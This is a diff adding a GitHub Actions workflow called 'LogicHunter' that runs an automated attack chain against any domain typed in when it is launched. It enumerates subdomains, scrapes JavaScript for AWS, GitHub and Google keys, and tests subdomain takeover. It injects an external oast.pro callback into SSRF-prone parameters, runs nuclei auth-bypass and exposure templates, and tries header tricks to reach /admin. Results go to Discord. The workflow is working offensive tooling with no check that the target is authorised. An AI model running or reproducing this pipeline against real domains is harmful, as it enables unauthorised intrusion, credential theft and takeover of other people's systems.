@@ -1,0 +1,130 @@
+name: "🧠 LogicHunter v2.9 - Final Stable Build"
+
+on:
+  workflow_dispatch:
+    inputs:
+      domain:
+        description: "Target Domain (e.g., datacamp.com)"
+        required: true
+
+jobs:
+  hunt:
+    runs-on: ubuntu-latest
+    timeout-minutes: 120
+    permissions:
+      contents: write
+
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-go@v5
+        with:
+          go-version: "1.22"
+
+      - name: "0. Set Target Environment & Pre-touch 🎯"
+        run: |
+          D="${{ github.event.inputs.domain }}"
+          echo "DOMAIN=$D" >> $GITHUB_ENV
+          mkdir -p /tmp/hunt/$D/{urls,auth,ssrf,takeover,js}
+          # إنشاء الملفات مسبقاً لمنع انهيار grep أو wc أو Discord step
+          touch /tmp/hunt/$D/urls/all.txt /tmp/hunt/$D/auth/bypass_results.txt /tmp/hunt/$D/js/secrets.txt /tmp/hunt/$D/takeover/subzy.txt /tmp/hunt/$D/ssrf/results.txt
+
+      - name: "1. Tool Setup & Tooling Prep 🏗️"
+        run: |
+          sudo apt-get update -y && sudo apt-get install -y jq
+          export GOPATH=$HOME/go
+          export PATH=$PATH:$HOME/go/bin
+          go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
+          go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
+          go install github.com/projectdiscovery/katana/cmd/katana@latest
+          go install github.com/tomnomnom/gf@latest
+          go install github.com/tomnomnom/anew@latest
+          go install github.com/lc/gau/v2/cmd/gau@latest
+          go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+          go install github.com/PentestPad/subzy@latest
+          
+          echo "$HOME/go/bin" >> $GITHUB_PATH
+          rm -rf /tmp/gfp
+          git clone --depth 1 https://github.com/1ndianl33t/Gf-Patterns /tmp/gfp || true
+          mkdir -p ~/.gf && cp /tmp/gfp/*.json ~/.gf/ || true
+          nuclei -update-templates -silent
+
+      - name: "2. Recon & Logic-Based Filtering 🧹"
+        run: |
+          D="$DOMAIN"
+          subfinder -d $D -all -silent | httpx -silent -status-code -follow-redirects -threads 50 -timeout 10 -retries 1 | tee /tmp/hunt/$D/urls/live.txt
+          cat /tmp/hunt/$D/urls/live.txt | awk '{print $1}' > /tmp/hunt/$D/urls/targets.txt
+          
+          gau --threads 5 $D | anew /tmp/hunt/$D/urls/all.txt
+          
+          # التحسين: فحص وجود أهداف قبل تشغيل Katana لمنع الفشل
+          if [ -s /tmp/hunt/$D/urls/targets.txt ]; then
+            cat /tmp/hunt/$D/urls/targets.txt | katana -silent -jc -d 2 -timeout 10 -c 20 | anew /tmp/hunt/$D/urls/all.txt
+          fi
+          
+          grep -vE "\.(png|jpg|jpeg|gif|svg|woff|css|mp4|webp|ico)$" /tmp/hunt/$D/urls/all.txt > /tmp/hunt/$D/urls/clean.txt
+
+      - name: "3. JS Secret Scan & SSRF Prep 🔑"
+        run: |
+          D="$DOMAIN"
+          grep -iE "\.js($|\?)" /tmp/hunt/$D/urls/clean.txt | head -100 > /tmp/hunt/$D/js/links.txt
+          # التحسين: استخدام IFS لضمان قراءة الروابط المعقدة بشكل سليم
+          while IFS= read -r JS; do
+            curl -sk "$JS" --max-time 10 | grep -Eoi "(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{20,}|AIza[0-9A-Za-z\\-_]{35})" >> /tmp/hunt/$D/js/secrets.txt || true
+          done < /tmp/hunt/$D/js/links.txt
+
+      - name: "4. Takeover & SSRF 🏴‍☠️👁️"
+        run: |
+          D="$DOMAIN"
+          cat /tmp/hunt/$D/urls/targets.txt | sed 's|https\?://||' | cut -d/ -f1 | sort -u > /tmp/hunt/$D/subs.txt
+          subzy run --targets /tmp/hunt/$D/subs.txt --concurrency 20 --hide_fails --verify_ssl --output /tmp/hunt/$D/takeover/subzy.txt || true
+          
+          interactsh-client -server oast.pro -o /tmp/interact.txt > /dev/null 2>&1 &
+          sleep 5
+          INTERACT=$(grep -oE "[a-z0-9]+\.oast\.pro" /tmp/interact.txt | head -1)
+          if [ ! -z "$INTERACT" ]; then
+            cat /tmp/hunt/$D/urls/clean.txt | gf ssrf 2>/dev/null | head -20 | while read URL; do
+              TEST=$(echo "$URL" | sed "s|=.*|=http://$INTERACT|")
+              curl -sk "$TEST" --max-time 8 > /dev/null 2>&1 || true
+            done
+          fi
+          sleep 10
+          cat /tmp/interact.txt > /tmp/hunt/$D/ssrf/results.txt
+          pkill -f interactsh-client || true
+
+      - name: "5. Nuclei & Auth Bypass 🛡️🔓"
+        run: |
+          D="$DOMAIN"
+          nuclei -list /tmp/hunt/$D/urls/targets.txt -tags auth,bypass,jwt,exposure,takeover -severity critical,high,medium -rl 80 -timeout 10 -retries 1 -silent -json -o /tmp/hunt/$D/nuclei.json || true
+          
+          HEADERS=("X-Original-URL: /admin" "X-Rewrite-URL: /admin" "X-Forwarded-For: 127.0.0.1")
+          head -15 /tmp/hunt/$D/urls/targets.txt | while read HOST; do
+            for H in "${HEADERS[@]}"; do
+              STATUS=$(curl -sk -H "$H" -o /dev/null -w "%{http_code}" "$HOST/admin" --max-time 5)
+              if [ "$STATUS" = "200" ] || [ "$STATUS" = "201" ]; then
+                echo "[BYPASS] $HOST/admin with $H" >> /tmp/hunt/$D/auth/bypass_results.txt
+              fi
+            done
+          done
+
+      - name: "6. Discord Notification 📢"
+        if: always()
+        run: |
+          D="$DOMAIN"
+          # التحسين: التأكد من وجود قيم عددية لمنع فشل jq
+          B=$(wc -l < /tmp/hunt/$D/auth/bypass_results.txt || echo 0)
+          J=$(wc -l < /tmp/hunt/$D/js/secrets.txt || echo 0)
+          T=$(wc -l < /tmp/hunt/$D/takeover/subzy.txt || echo 0)
+          [ -z "$B" ] && B=0; [ -z "$J" ] && J=0; [ -z "$T" ] && T=0
+          
+          jq -n --arg d "$D" --arg b "$B" --arg j "$J" --arg t "$T" \
+          '{username:"🧠 LogicHunter", embeds:[{title:"Scan Complete: "+$d, color:15158332, fields:[{name:"🔓 Bypass",value:$b,inline:true},{name:"🔑 JS Secrets",value:$j,inline:true},{name:"🏴‍☠️ Takeover",value:$t,inline:true}]}]}' | \
+          curl -s -X POST "${{ secrets.DISCORD_WEBHOOK }}" -H "Content-Type: application/json" -d @- || true
+
+      - name: "7. Upload Results 📦"
+        uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: logic-hunter-${{ env.DOMAIN }}
+          path: /tmp/hunt/
+          retention-days: 30
